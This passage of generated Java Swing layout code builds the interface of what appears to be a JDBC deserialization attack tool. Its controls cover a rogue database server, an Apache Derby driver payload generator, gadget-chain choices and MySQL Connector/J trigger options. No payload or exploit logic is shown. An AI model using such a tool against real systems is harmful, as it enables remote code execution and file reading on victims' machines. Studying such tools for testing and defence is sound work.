        dbOpPanel.setBackground(new Color(-1120293));
        dbStatusPanel.add(dbOpPanel, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        dbStartBtn = new JButton();
        dbStartBtn.setText("Start Server");
        dbOpPanel.add(dbStartBtn, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        dbStopBtn = new JButton();
        dbStopBtn.setText("Stop Server");
        dbOpPanel.add(dbStopBtn, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        dbAddrPanel = new JPanel();
        dbAddrPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
        dbAddrPanel.setBackground(new Color(-1120294));
        derbyPanel.add(dbAddrPanel, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        dbAddrLabel = new JLabel();
        dbAddrLabel.setText("Address");
        dbAddrPanel.add(dbAddrLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        dbAddrText = new JTextField();
        dbAddrText.setText("");
        dbAddrPanel.add(dbAddrText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        dbPayloadPanel = new JPanel();
        dbPayloadPanel.setLayout(new GridLayoutManager(2, 4, new Insets(0, 0, 0, 10), -1, -1));
        dbPayloadPanel.setBackground(new Color(-1120294));
        derbyPanel.add(dbPayloadPanel, new GridConstraints(3, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        dbUrlLabel = new JLabel();
        dbUrlLabel.setText("URL");
        dbPayloadPanel.add(dbUrlLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        genDerbyPayloadBtn = new JButton();
        genDerbyPayloadBtn.setText("Generate Apache Derby Driver Payload");
        dbPayloadPanel.add(genDerbyPayloadBtn, new GridConstraints(0, 3, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        dbPayScroll = new JScrollPane();
        dbPayloadPanel.add(dbPayScroll, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 250), new Dimension(-1, 250), new Dimension(-1, 250), 1, false));
        dbPayArea = new JTextArea();
        dbPayArea.setLineWrap(true);
        dbPayScroll.setViewportView(dbPayArea);
        dbUrlText = new JTextField();
        dbUrlText.setEditable(false);
        dbPayloadPanel.add(dbUrlText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        dbSerPanel = new JPanel();
        dbSerPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
        dbSerPanel.setBackground(new Color(-1120294));
        derbyPanel.add(dbSerPanel, new GridConstraints(2, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        dbSerScroll = new JScrollPane();
        dbSerScroll.setBackground(new Color(-1120294));
        dbSerPanel.add(dbSerScroll, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 100), new Dimension(-1, 100), new Dimension(-1, 100), 0, false));
        dbSerScroll.setBorder(BorderFactory.createTitledBorder(null, "Serialization Data", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        dbSerDataArea = new JTextArea();
        dbSerDataArea.setText("");
        dbSerScroll.setViewportView(dbSerDataArea);
        logPanel = new JPanel();
        logPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
        logPanel.setBackground(new Color(-1120293));
        logPanel.setEnabled(true);
        masterPanel.add(logPanel, new GridConstraints(2, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        logPanel.setBorder(BorderFactory.createTitledBorder(null, "Log", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        logStroll = new JScrollPane();
        logStroll.setBackground(new Color(-1120293));
        logPanel.add(logStroll, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(600, 200), null, null, 0, false));
        logArea = new JTextArea();
        logArea.setBackground(new Color(-11513776));
        logArea.setEditable(false);
        logArea.setForeground(new Color(-11206882));
        logStroll.setViewportView(logArea);
        ButtonGroup buttonGroup;
        buttonGroup = new ButtonGroup();
        buttonGroup.add(deserButton);
        buttonGroup.add(fileReadButton);
        buttonGroup = new ButtonGroup();
        buttonGroup.add(jdk7Button);
        buttonGroup.add(cc44Button);
        buttonGroup.add(jdk8Button);
        buttonGroup.add(urldnsButton);
        buttonGroup.add(cbButton);
        buttonGroup.add(cc31Button);
        buttonGroup.add(useCustomGadgetBase64RadioButton);
        buttonGroup = new ButtonGroup();
        buttonGroup.add(detectCustomCollationsRadioButton);
        buttonGroup.add(serverStatusDiffInterceptorRadioButton);
        buttonGroup = new ButtonGroup();
        buttonGroup.add(v5105118RadioButton);
        buttonGroup.add(v51195128RadioButton);
        buttonGroup.add(v51295148RadioButton);
        buttonGroup.add(v602606RadioButton);
        buttonGroup.add(v8078020RadioButton);
        buttonGroup = new ButtonGroup();
        buttonGroup.add(windowsRadioButton);
        buttonGroup.add(linuxRadioButton);
    }

    /**
     * @noinspection ALL
     */
    public JComponent $$$getRootComponent$$$() {
        return masterPanel;
    }

}
